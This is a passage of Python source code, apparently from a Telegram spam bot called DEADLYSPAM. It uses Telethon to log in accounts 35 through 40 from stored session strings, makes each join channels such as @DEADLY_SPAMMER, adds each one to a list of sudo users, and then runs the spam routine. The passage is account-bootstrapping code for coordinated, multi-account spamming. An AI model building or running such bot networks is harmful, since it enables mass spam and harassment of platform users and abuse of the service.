        pass
        session_name = ""
        SAM35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        SAM36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await SAM36.start()
            botme = await SAM36.get_me()
            await SAM36(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM36(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM36(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = ""
        SAM36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        SAM37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await SAM37.start()
            botme = await SAM37.get_me()
            await SAM37(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM37(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM37(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = ""
        SAM37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        SAM38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await SAM38.start()
            botme = await SAM38.get_me()
            await SAM38(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM38(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM38(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = ""
        SAM38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        SAM39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await SAM39.start()
            botme = await SAM39.get_me()
            await SAM39(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM39(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM39(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = ""
        SAM39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        SAM40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await SAM40.start()
            botme = await SAM40.get_me()
            await SAM40(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM40(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM40(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = ""
        SAM40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(DEADLYSPAM())
